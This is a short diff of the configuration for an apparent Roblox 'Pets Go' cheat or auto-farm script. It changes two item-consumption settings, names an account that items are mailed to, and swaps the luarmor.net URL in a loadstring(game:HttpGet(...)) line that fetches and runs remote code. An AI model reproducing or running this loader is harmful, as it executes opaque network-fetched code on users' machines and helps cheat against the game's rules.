@@ -6,9 +6,9 @@ getgenv().petsGoConfig = {
     CONSUME_ALL_MINING_CHEST = false,
     CONSUME_EVENT_EGG = false, -- Hype eggs not included
     CONSUME_ALL_THIEVING_CHEST = false,
-    CONSUME_INSTA_LUCK_4 = false,
+    CONSUME_INSTA_LUCK_4 = true,
     IGNORE_DICE_COMBO = false, -- Consume Insta Luck 3 without combo
-    CONSUME_VAULT_KEY = false,
+    CONSUME_VAULT_KEY = true,
     CONSUME_KRAKEN_TENTACLE = true,
     CONSUME_BUCKET_O_CHUM = true,
     CONSUME_ALL_FISHING_CHEST = false,
@@ -29,4 +29,4 @@ getgenv().petsGoConfig = {
     USERNAME_TO_MAIL = {"RangelJohn421"} -- Mail to username, Example : USERNAME_TO_MAIL = {"username1", "username2"} 
 }
 
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/e81ea00ef49a917bb1242da4f41dc4f9.lua"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/cd1c29852c6641789162a7b0a4c97428.lua"))()
